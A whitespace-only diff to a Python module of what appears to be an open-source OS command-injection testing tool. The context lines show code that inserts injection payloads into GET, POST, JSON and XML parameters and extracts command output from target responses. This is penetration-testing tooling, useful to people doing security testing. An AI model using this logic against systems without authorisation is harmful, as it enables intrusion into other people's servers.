@@ -9,7 +9,7 @@ This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
- 
+
 For more see the file 'readme/COPYING' for copying permission.
 """
 import re
@@ -36,7 +36,7 @@ try:
   unescape = html.unescape
 except:  # Python 2
   unescape = _html_parser.HTMLParser().unescape
-  
+
 """
 The "classic" technique on result-based OS command injection.
 """
@@ -44,7 +44,7 @@ The "classic" technique on result-based OS command injection.
 """
 Check if target host is vulnerable.
 """
-def injection_test(payload, http_request_method, url):       
+def injection_test(payload, http_request_method, url):
 
   # Check if defined POST data
   if not settings.USER_DEFINED_POST_DATA:
@@ -54,7 +54,7 @@ def injection_test(payload, http_request_method, url):
     vuln_parameter = parameters.vuln_GET_param(url)
     target = url.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
     request = _urllib.request.Request(target)
-    
+
     # Check if defined extra headers.
     headers.do_check(request)
 
@@ -68,7 +68,7 @@ def injection_test(payload, http_request_method, url):
     # Check if its not specified the 'INJECT_HERE' tag
     parameter = parameters.do_POST_check(parameter, http_request_method)
     parameter = ''.join(str(e) for e in parameter).replace("+","%2B")
-    # Define the POST data   
+    # Define the POST data
     if settings.IS_JSON:
       data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace("\"", "\\\"")))
       try:
@@ -76,14 +76,14 @@ def injection_test(payload, http_request_method, url):
       except ValueError:
         pass
     elif settings.IS_XML:
-      data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload)) 
+      data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload))
     else:
       data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
     request = _urllib.request.Request(url, data.encode(settings.DEFAULT_CODEC))
-    
+
     # Check if defined extra headers.
     headers.do_check(request)
-    
+
     # Define the vulnerable parameter
     vuln_parameter = parameters.vuln_POST_param(parameter, url)
 
@@ -158,14 +158,14 @@ def injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_meth
     else:
       # Classic decision payload (check if host is vulnerable).
       payload = cb_payloads.cmd_execution(separator, TAG, cmd)
-      
+
     # Fix prefixes / suffixes
     payload = parameters.prefixes(payload, prefix)
     payload = parameters.suffixes(payload, suffix)
 
     # Whitespace fixation
     payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
-    
+
     # Perform payload modification
     payload = checks.perform_payload_modification(payload)
 
@@ -199,19 +199,19 @@ def injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_meth
     else:
       # Check if defined POST data
       if not settings.USER_DEFINED_POST_DATA:
-        
+
         # Check if its not specified the 'INJECT_HERE' tag
         #url = parameters.do_GET_check(url, http_request_method)
         target = url.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
         vuln_parameter = ''.join(vuln_parameter)
         request = _urllib.request.Request(target)
-        
+
         # Check if defined extra headers.
-        headers.do_check(request)    
+        headers.do_check(request)
 
         # Get the response of the request.
         response = requests.get_request_response(request)
-            
+
       else :
         # Check if defined method is POST.
         parameter = menu.options.data
@@ -219,7 +219,7 @@ def injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_meth
         # Check if its not specified the 'INJECT_HERE' tag
         parameter = parameters.do_POST_check(parameter, http_request_method)
         parameter = ''.join(str(e) for e in parameter).replace("+","%2B")
-        # Define the POST data    
+        # Define the POST data
         if settings.IS_JSON:
           data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace("\"", "\\\"")))
           try:
@@ -227,17 +227,17 @@ def injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_meth
           except ValueError:
             pass
         elif settings.IS_XML:
-          data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload)) 
+          data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload))
         else:
           data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
         request = _urllib.request.Request(url, data.encode(settings.DEFAULT_CODEC))
-        
+
         # Check if defined extra headers.
         headers.do_check(request)
 
         # Get the response of the request.
         response = requests.get_request_response(request)
-   
+
     return response
 
   # Do the injection check
@@ -274,7 +274,7 @@ def injection_results(response, TAG, cmd):
       if end_line in html_data:
         html_data = html_data.replace(end_line, settings.SINGLE_WHITESPACE)
         break
-   
+
     shell = re.findall(r"" + TAG + TAG + "(.*)" + TAG + TAG + settings.SINGLE_WHITESPACE, html_data)
     if not shell:
       shell = re.findall(r"" + TAG + TAG + "(.*)" + TAG + TAG + "", html_data)
@@ -289,7 +289,7 @@ def injection_results(response, TAG, cmd):
     except UnicodeDecodeError:
       pass
     if settings.TARGET_OS == settings.OS.WINDOWS:
-      if menu.options.alter_shell: 
+      if menu.options.alter_shell:
         shell = [right_space.rstrip() for right_space in shell]
         shell = [left_space.lstrip() for left_space in shell]
         if "<<<<" in shell[0]:
@@ -297,11 +297,11 @@ def injection_results(response, TAG, cmd):
       else:
         if shell[0] == "%i" :
           false_result = True
-          
+
   except AttributeError:
     false_result = True
 
   if false_result:
     shell = ""
-    
+
   return shell
